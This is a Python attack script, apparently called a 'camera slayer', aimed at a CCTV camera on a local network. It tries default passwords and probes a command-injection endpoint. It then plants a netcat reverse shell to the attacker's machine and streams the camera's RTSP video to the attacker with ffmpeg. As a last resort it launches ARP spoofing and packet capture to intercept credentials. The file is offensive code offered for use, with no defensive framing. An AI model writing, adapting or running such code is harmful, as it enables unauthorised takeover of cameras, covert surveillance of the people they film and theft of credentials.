import requests
import socket
import threading
import time
import base64
import subprocess
from urllib.parse import quote

# Target Camera
CAMERA_IP = "192.168.1.100"
HTTP_PORT = 80
RTSP_PORT = 554
LOCAL_C2 = "192.168.1.200:4444"  # My machine on the LAN

# Step 1: Crack Default Creds
def try_default_creds():
    creds = [("admin", "admin"), ("admin", "12345"), ("root", "123456")]
    for user, pwd in creds:
        try:
            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            headers = {"Authorization": f"Basic {auth}"}
            r = requests.get(f"http://{CAMERA_IP}:{HTTP_PORT}/", headers=headers, timeout=3)
            if r.status_code == 200 and "login" not in r.text.lower():
                print(f"Access granted: {user}:{pwd}")
                return user, pwd
        except:
            pass
    print("No default creds—going deeper.")
    return None, None

# Step 2: Exploit Web Interface (Command Injection)
def inject_command():
    # Fake vuln: /system.cgi?cmd= allows shell commands
    payload = "; id"  # Test with 'uid' output
    url = f"http://{CAMERA_IP}:{HTTP_PORT}/system.cgi?cmd={quote(payload)}"
    try:
        r = requests.get(url, timeout=3)
        if "uid=" in r.text:
            print("Injection hit—camera’s vulnerable!")
            return True
    except:
        pass
    print("No web vuln—trying RTSP.")
    return False

# Step 3: Plant a Local Reverse Shell
def plant_shell():
    # Inject a netcat reverse shell to my LAN C2
    shell_cmd = f"; nc -e /bin/sh {LOCAL_C2.split(':')[0]} {LOCAL_C2.split(':')[1]}"
    url = f"http://{CAMERA_IP}:{HTTP_PORT}/system.cgi?cmd={quote(shell_cmd)}"
    try:
        requests.get(url, timeout=3)
        print("Shell planted—listening locally...")
        return True
    except:
        return False

# Step 4: Snag the RTSP Feed
def grab_rtsp():
    rtsp_url = f"rtsp://{CAMERA_IP}:{RTSP_PORT}/live"
    try:
        # Simulate streaming with ffmpeg (needs local install)
        subprocess.Popen(["ffmpeg", "-i", rtsp_url, "-f", "mpegts", "udp://192.168.1.200:1234"])
        print(f"Streaming {rtsp_url} to my UDP sink!")
        return True
    except:
        print("RTSP blocked—escalating.")
        return False

# Step 5: MITM Fallback (LAN Sniffing)
def mitm_sniff():
    # Fake ARP poison to intercept creds
    print("Launching MITM—spoofing ARP...")
    subprocess.Popen(["arpspoof", "-i", "eth0", "-t", CAMERA_IP, "192.168.1.1"])
    # Sniff with tcpdump (separate terminal)
    print("Run: tcpdump -i eth0 host 192.168.1.100 -w cam.pcap")
    return True

# Step 6: The Slayer’s Strike
def camera_slayer():
    print(f"Slaying CCTV at {CAMERA_IP} on the LAN...")
    
    # Easy win: Default creds
    user, pwd = try_default_creds()
    if user:
        if grab_rtsp():
            return
    
    # Exploit web vuln
    if inject_command():
        if plant_shell():
            threading.Thread(target=listen_shell, daemon=True).start()
        return
    
    # Fallback to RTSP
    if grab_rtsp():
        return
    
    # Last resort: MITM
    mitm_sniff()

def listen_shell():
    # Local netcat listener (run: nc -lvp 4444)
    print(f"Shell listener up at {LOCAL_C2}—camera’s mine!")
    time.sleep(2)  # Give shell time to connect

if __name__ == "__main__":
    camera_slayer()
